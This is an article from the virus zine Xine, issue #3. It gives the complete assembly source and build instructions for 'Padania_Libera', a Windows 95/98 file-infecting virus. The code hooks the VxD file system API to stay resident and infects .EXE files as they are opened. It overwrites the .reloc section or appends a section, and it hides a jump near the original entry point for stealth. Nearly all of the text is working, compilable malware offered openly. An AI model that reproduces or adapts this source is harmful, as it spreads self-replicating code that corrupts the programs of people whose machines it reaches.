   ;                                        /-----------------------------\
   ;                                        | Xine - issue #3 - Phile 202 |
   ;                                        \-----------------------------/


   ;
   ; Virus Name    : Padania_Libera
   ; Virus Author  : b0z0/iKX
   ; Origin        : Padania, 1998
   ; Platform      : Win 95/98
   ; Target        : PE files
   ; Compiling     : TASM 5.0 and TLINK 5.0 should be used
   ;                       tasm32 /ml /m3 padlib,,;
   ;                       tlink32 /Tpe /aa /c /v padlib,padlib,,import32.lib,
   ;                 And then set the PE header so the data section will be loaded
   ;                 at C0000000.
   ; Goodies       : This is a TSR PE infector that goes resident by coping itself
   ;                 in the unused 1000h at 0c0000000h and then hooks the VxD
   ;                 functions. So there isn't any need to search the adresses
   ;                 of the APIs. Thanx to Murkry/IkX for the help for this part
   ;                 of the virus!
   ;                 As for file infection the virus can actually infect the file
   ;                 in three simillar ways, depending on the file structure. If
   ;                 the victim doesn't have a .reloc section, then the virus will
   ;                 just add a new object and put the EIP in PE to point on it.
   ;                 If the victim has a .reloc section the virus will overwrite
   ;                 this section with its code and change the PE header so it
   ;                 doesn't think anymore about the fixup section. After this
   ;                 the virus will have two ways of gaining control to that
   ;                 position. One is the simple to change the EIP in the PE
   ;                 header, while the second is to put a JMP from the body
   ;                 of the program to the virus. To find a suitable position
   ;                 where to put the JMP the virus will use the original .reloc
   ;                 section that contains useful data to find suitable
   ;                 instructions. The virus will put the JMP near the original
   ;                 EIP, so it is very probable it will be executed (thus
   ;                 putting the JMP in a random position should not activate the
   ;                 virus too often).
   ;                 By overwriting the .reloc it is very probable that the
   ;                 filesize of the infected file won't change (very often the
   ;                 dimension of the .reloc is anyway > of the virus length)
   ;                 thus making this also a sorta stealth add-on.
   ;                 Please check the article about Win95/98/32 ideas for more
   ;                 explanations and hints about this method.
   ; Special thanx : to Murkry/IkX for his help with Win95/98/32 stuff!
   ;

   .386

   .model flat


   InstallFileSystemApiHook        = 00400067h
   UniToBCSPath                    = 00400041h
   IFSMgr_Ring0_FileIO             = 00400032h

   peheader        = (buffer - start + starthigh)

   extrn           ExitProcess:PROC

   starthigh       = 0c0000000h

   .data                                   ;the data area

   start:
           mov     eax,0c0001000h          ; starting scan location
           mov     ecx,1000h               ; how much bytes to check

   vmm_start_loop:
           mov     ebx,[eax]
           cmp     ebx,0c0002000h          ; should be > of this
           jb      bad_entry
           cmp     ebx,0c0020000h          ; and not > than this limit
           ja      bad_entry               ; to prevent GPFs

           cmp     dword ptr [ebx+0ch],' MMV'      ; got it?
           je      got_chain

   bad_entry:
           inc     eax
           loop    vmm_start_loop

           jmp     RetToHost

   got_chain:
           mov     ebx,[ebx+30h]
           mov     eax,ebx
           add     eax,003ch

           push    eax
           pop     dword ptr ds:[(origifs + 2) - start + starthigh]

           push    dword ptr ds:[eax]
           pop     dword ptr ds:[vxdoff - start + starthigh]

           push    (NewHandler - start + starthigh)
           pop     dword ptr [ebx+3ch]

           mov     word ptr ds:[int20_place - start + starthigh],020cdh

   RetToHost:
           inc      byte ptr ds:[chktsr - start + starthigh]
           ret

   NewHandler:

           push    cs
           push    dword ptr ds:[vxdoff - start + starthigh]
           push    dword ptr ds:[vxdoff - start + starthigh]

   origifs:
           pop     dword ptr ds:[12345678h]                ; restore orig ifs

           pushad

           mov     eax,(NewFShook - start + starthigh)
           push    eax
           push    InstallFileSystemApiHook
           call    make_vxdcall

           add     esp,04h
           mov     dword ptr ds:[oldfsd - start + starthigh],eax

           popad
           retf

   virus_name      db      0,'Padania_Libera',0

   make_vxdcall:
           pop     dword ptr ds:[back - start + starthigh]
           pop     dword ptr ds:[vxdcall - start + starthigh]
   int20_place:
           int     20h
   vxdcall dd      00h
           mov     word ptr ds:[int20_place - start + starthigh],020cdh
           db      68h     ; push immediate dd
   back    dd      00h
           ret

   author_orig     db      0,'by -b0z0/iKX-',0

   vxdcall_io:
           push    IFSMgr_Ring0_FileIO
           call    make_vxdcall
           ret

   NewFShook:
           push   ebp
           mov    ebp,esp
           sub    esp,00000020h

           push    ebx
           push    esi
           push    edi

           cmp     byte ptr ds:[chktsr - start +  starthigh],02
           je      letOrginal

           cmp     dword ptr [ebp+0ch],00000024h           ; open file
           jne     letOrginal

           inc    byte ptr ds:[chktsr - start +  starthigh]

           pushad

           mov     edi,(filename - start + starthigh)

           mov     eax,[ebp+10h]            ;Primary Data buffer of the IOREQ
           cmp     al,0ffh
           je      noneeddriveletter

           add     al,40h                   ; create the c:
           mov     ah,':'
           stosw

   noneeddriveletter:

           db      68h     ; push imm dd 00
           dd      00h

           db      68h     ; push imm dd ff
           dd      0ffh

           mov    ebx,[ebp+1ch]
           mov    eax,[ebx+0ch]            ; get input filename
           add    eax,04h
           push   eax

           push    edi

           push    UniToBCSPath
           call    make_vxdcall
           add     esp,10h

           add     edi,eax
           xor     al,al
           stosb

           cmp     dword ptr [edi - 5],"EXE."
           jne     exitvvxd_noatt

           mov     esi,(filename - start + starthigh)

           mov     eax,4300h                       ; get attribs
           push    eax
           call    vxdcall_io
           pop     eax
           jc      exitvvxd_noatt

           push    esi
           push    ecx                             ; attribs on the stack

           inc     eax
           xor     ecx,ecx                         ; delete attribs
           call    vxdcall_io
           jc      exitvvxd

           mov     eax,0d500h                   ; open file
           xor     ecx,ecx
           push    ecx
           pop     dword ptr ds:[vxdoff - start + starthigh]
           mov     ebx,2
           mov     edx,1
           call    vxdcall_io
           jb      exitvvxd

           mov     ebx,eax                         ; file handle

           mov     ecx,04h
           mov     edx, 03ch                       ; read pointer to PE header
           mov     eax,0d600h
           mov     esi,(peptr - start + starthigh)
           push    eax
           call    vxdcall_io
           pop     eax

           mov     ecx,400h                        ; read 1kb of PE
           mov     edx,dword ptr ds:[peptr - start + starthigh]
           mov     esi,(buffer - start + starthigh)
           call    vxdcall_io

           cmp     dword ptr [esi],04550h           ; is PE
           jne     closefile

           cmp     dword ptr ds:[esi + 44h],'0z0b' ; already infected?
           je      closefile

           mov     eax,0d800h                      ; get file size in eax
           call    vxdcall_io
           mov     dword ptr ds:[filesize - start +  starthigh],eax

           mov     edi,peheader + 0f8h             ; on object table

           push    edi

           xor     eax,eax
           mov     ax,word ptr ds:[peheader + 6]   ; how many sections

           cmp     ax,11h                          ; humm, if so it should not
           jb      search_reloc                    ; be enough our 1kb buffer

           pop     eax                             ; correct stack and exit
           jmp     closefile

   search_reloc:
           cmp     dword ptr [edi],'ler.'          ; search the .reloc
           jne     no_rel

           cmp     word ptr [edi+4],'co'
           je      got_reloc
   no_rel:
           add     edi,28h
           dec     eax
           or      eax,eax
           jnz     search_reloc

   no_reloc_present:
   ; if no .reloc or .reloc not last one or if we shouldn't put out jump near the
   ; entry point then we must add an object

           inc     word ptr ds:[peheader + 6]              ; obj number

           xor     eax,eax
           mov     dword ptr ds:[relocs - start + starthigh + 4],eax
           jmp     put_virsize

   got_reloc:
   ; if got .reloc and is the last one then just overwrite this one.
           cmp     ax,1                            ; must be last one!
           jne     no_rel

           mov     edx,dword ptr [edi + 14h]       ; physical offset where we
                                                   ; will write virus code
   find_rightone:
           mov     eax,0d600h                      ; read 208h bytes out of the
           mov     esi,(relocs - start + starthigh)        ; .reloc section
           mov     cx,208h
           call    vxdcall_io

           mov     eax,dword ptr ds:[peheader + 28h]       ; orig EIP
           and     eax,0fffff000h
           cmp     eax,dword ptr ds:[relocs - start + starthigh]
           jbe     have_the_one                    ; got one! or if < then just
                                                   ; exit, since no near block
                                                   ; present

           add     edx,dword ptr ds:[relocs - start + starthigh + 4]
           jmp     find_rightone

   have_the_one:

           mov     edx,dword ptr [edi + 14h]
           mov     dword ptr ds:[filesize - start + starthigh],edx

           xor     eax,eax
           mov     dword ptr ds:[peheader + 0a0h],eax      ; delete fixups infos
           mov     dword ptr ds:[peheader + 0a4h],eax      ; in header

           cmp     dword ptr [edi + 10h], virus_size       ; compare phys. size
           ja      put_reloc_size

   put_virsize:
           push    virus_size
           jmp     set_ph_size

   put_reloc_size:
           push    dword ptr ds:[edi + 10h]                ; so the physical size
                                                           ; will fit the real
                                                           ; size on disk
   set_ph_size:
           pop     dword ptr ds:[(phy_size - start + starthigh)]

   no_change_reloc:
           pop     eax                             ; begin of objects in mem
           sub     eax,edi                         ; so -eax = lenght of all objs
           push    eax
           add     eax,dword ptr ds:[peheader + 0f8h + 14h]  ; where the first
                                                             ; object starts

           cmp     eax,obj_size                    ; enough space in object table
           pop     eax
           jb      closefile                       ; for object + loader?

           neg     eax
           add     eax,(obj_size + 0f8h)           ; + PE hdr + our code
           add     eax,dword ptr ds:[peptr - start + starthigh]
           cmp     eax,dword ptr ds:[peheader + 54h] ; be sure that enough header
           jb      enough_header                     ; is loaded in memory

           add     dword ptr ds:[peheader + 54h],200h      ; so add just enough :)

   enough_header:
           mov     edx,starthigh
           sub     edx,dword ptr ds:[peheader + 34h]
           mov     dword ptr ds:[(obj_rva - start + starthigh)],edx

           push    edi             ; location in PeHeader of new section header
           mov     esi,(object_begin - start +  starthigh)
           mov     ecx,obj_size
           rep     movsb
           pop     edi

           mov     eax,dword ptr ds:[filesize - start +  starthigh]

           push    eax             ; save the size
           xor     edx,edx
           mov     ecx,dword ptr ds:[peheader + 3ch]
           div     ecx
           sub     ecx,edx
           pop     edx

   ; Extend the file to the file alignment if needed (of course not if
   ; overwriting the .reloc)

           mov     eax,0d601h              ; filewrite
           mov     esi,starthigh

           push    eax

           cmp     ecx,dword ptr ds:[peheader + 3ch]
           je      aligned

           add     dword ptr ds:[filesize - start + starthigh],ecx
           call    vxdcall_io              ; put alignment
   aligned:
           pop     eax
           mov     edx, dword ptr ds:[filesize - start + starthigh]
           mov     dword ptr ds:[edi + 14h],edx

           mov     ecx,virus_size           ; write virus body
           push    eax
           call    vxdcall_io

           add     edx,eax                 ; write tsr check byte zeroed
           pop     eax
           mov     ecx,5
           mov     esi,(needed_zero - start + starthigh)
           call    vxdcall_io

           mov     dword ptr ds:[peheader + 44h],'0z0b'

           mov     edx,dword ptr ds:[peptr - start + starthigh]

           push    edx

           mov     eax,edi
           sub     eax,(peheader - 28h)    ; - offset in mem + our object size
           add     eax,edx                 ; EAX = new EIP

           push    eax                     ; new EIP
           pop     dword ptr ds:[(jmp_addr - start + starthigh)]

           cmp     dword ptr ds:[relocs - start + starthigh + 4],00h
           je      change_in_pe

           mov     ecx,dword ptr ds:[peheader + 28h]       ; orig EIP
           push    ecx
           and     ecx,0fffff000h                  ; is the same 4k block?
           cmp     ecx,dword ptr ds:[relocs - start + starthigh]
           pop     ecx
           jne     change_in_pe
           and     ecx,0fffh                       ; just last 12 bits

           push    (relocs - start + starthigh + 8)
           pop     dword ptr ds:[rel_pos - start + starthigh]

   another_reloc:
           push    dword ptr ds:[(rel_pos - start + starthigh)]
           pop     esi
           xor     eax,eax
           lodsw

           or      ax,ax           ; end of relocs??
           jz      change_in_pe

           push    esi
           pop     dword ptr ds:[(rel_pos - start + starthigh)]

           push    ax
           shr     ax,0ch
           cmp     ax,03           ; 32bit relocation?
           pop     ax
           jne     another_reloc
           shl     ax,4            ; away reloc type
           shr     ax,4
           cmp     eax,ecx         ; find the first one after the orig EIP
           jbe     another_reloc   ; or just the next one if previous was bad

           push    eax
           in      al,40h
           shr     al,1            ; sorta rnd to select if use this one or no..
   no_good:                        ; so about 50% probability to use this..
           pop     eax
           jc      another_reloc

   ; so EAX has offset to the reloc we want to change

           add     eax,dword ptr ds:[relocs - start + starthigh]   ; RVA in mem

           mov     ecx,eax

           add     eax,4           ; on next instruction
           push    eax
           sub     eax,dword ptr ds:[jmp_addr - start + starthigh]
           sub     eax,(mid_jmp - entry_point)
           mov     dword ptr ds:[edi + return_addr - objname],eax

           sub     ecx,dword ptr ds:[peheader + 0f8h + 0ch] ; RVA
           add     ecx,dword ptr ds:[peheader + 0f8h + 14h] ; physical offset

           dec     ecx                     ; two bytes before the relocated addr
           dec     ecx

           mov     edx,ecx
           mov     ecx,06h
           mov     eax,0d600h                      ; read the orig instruction
           mov     esi,edi
           add     esi,(orig_code - objname)
           call    vxdcall_io

           pop     eax
           xor     ecx,ecx

           cmp     byte ptr [esi],0ffh             ; probable 2 byte one?
           je      check_our_two

           cmp     byte ptr [esi+1],068h           ; push xxxx
           jne     another_reloc

           mov     byte ptr [esi],90h      ; pad with nop the orig instruction
           inc     edx                     ; so must write one byte later
           jmp     ok_instru

   check_our_two:
           inc     ecx                     ; so one more byte to write
           cmp     byte ptr [esi+1],015h           ; call [xxxx]
           je      ok_twob
           cmp     byte ptr [esi+1],035h           ; push [xxxx]
           jne     another_reloc
   ok_twob:
           dec     eax
   ok_instru:
           sub     dword ptr ds:[(jmp_addr - start + starthigh)],eax

           mov     esi,(mid_jmp - start + starthigh)
           add     ecx,05h
           mov     eax,0d601h
           call    vxdcall_io

           mov     byte ptr ds:[edi + end_jump + 1 - objname],07h

           jmp     rewrite_header

   change_in_pe:
           mov     byte ptr ds:[edi + end_jump + 1 - objname],00h
           mov     eax,dword ptr ds:[(jmp_addr - start + starthigh)]
           xchg    eax,dword ptr ds:[peheader + 28h]        ; set new eip
           add     eax,dword ptr ds:[peheader + 34h]
           mov     dword ptr ds:[edi + oldeiprva - objname],eax    ; save old eip

   rewrite_header:
           xor     eax,eax
           mov     edx,eax
           mov     ecx,028h
           mov     ax,word ptr ds:[peheader + 06h]        ; objects
           mul     ecx
           add     eax,0f8h + obj_size                     ; + PE + virus loader
           mov     ecx,eax                                 ; write just the needed
           mov     esi,(buffer - start + starthigh)        ; rewrite header
           mov     eax,0d601h                              ; write to file
           pop     edx
           call    vxdcall_io

   closefile:
           mov     eax,0d700h
           call    vxdcall_io

   exitvvxd:
           pop     ecx                             ; attribs
           pop     esi                             ; pointer to filename
           mov     eax,4301h
           call    vxdcall_io

   exitvvxd_noatt:
           popad
           dec     byte ptr ds:[chktsr - start + starthigh]

   letOrginal:

           mov    eax,[ebp+1ch]
           push   eax
           mov    eax,[ebp+18h]
           push   eax
           mov    eax,[ebp+14h]
           push   eax
           mov    eax,[ebp+10h]
           push   eax
           mov    eax,[ebp+0ch]
           push   eax
           mov    eax,[ebp+08h]
           push   eax

           db      0b8h            ; mov eax,
   oldfsd  dd      0
           call   [eax]

           add    esp,00000018h
           pop    edi
           pop    esi
           pop    ebx
           leave
           ret

   ; This is the new object and the virus loader code that will be placed just
   ; after the objects. the loader is put in this part of memory, because the
   ; c0000000 can't be written once it has already been, so it is very risky
   ; putting the loader there

   object_begin:
   objname         db      "Padania "
   virtualsize     dd      virus_size
   obj_rva         dd      00h
   phy_size        dd      00h
   phy_offs        dd      00h
   needed_zero     dd      00h,00h,00h
   Character       dd      0c0000040h

   entry_point:
           pushf

           cmp     byte ptr ds:[chktsr - start + starthigh],0      ; already tsr?
           jne     getout

           cmp     dword ptr ds:[orig_code - start + starthigh],"'NDP"
           jne     getout                  ; be sure it is our own code up there

           pushad

           call    delta_offset
   delta_offset:
           pop     eax

           add     eax,(here - delta_offset)
           push    eax
           push    starthigh                       ; jump up to virus code
           ret
   here:
           popad

   getout:
           popf

   end_jump:
           jmp     from_pe                         ; will jump depending on the
   from_pe:                                        ; type of infection done
                   db       0b8h                   ; mov eax
   oldeiprva       dd       offset return
                   jmp     eax                     ; here is loader execd from PE

   from_executable:

   orig_code       db      "PDN'98"                ; 6 bytes used for orig code
                           ; when overwriting some code with the jump to the virus
                           ; will be changed on infection. this 6 bytes also
                           ; carries virus origin ;)
                   db      0e9h            ; jump back when placing loader
   return_addr     dd      00h             ; in the middle of the code
   end_loader:

   mid_jmp         db      0e9h            ; temp code for the mid jmp gen
   endvirus:

   ;ÄÄ end of virus on disk ÄÄ

   jmp_addr        dd      00h

   chktsr          db      ?

   filename        db      100     dup (00)

   peptr           dd      0
   filesize        dd      0
   buffer          db      400h    dup (00)
   relocs          db      208h    dup (00)
   rel_pos         dd      0
   vxdoff          dd      0

   virus_size      = (endvirus - start)
   obj_size        = (end_loader - object_begin)

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   .code

   HOST:
           push    (entry_point - start  + starthigh)      ; 1st gen code
           ret

   return:
           push    LARGE -1
           call    ExitProcess

           end     HOST
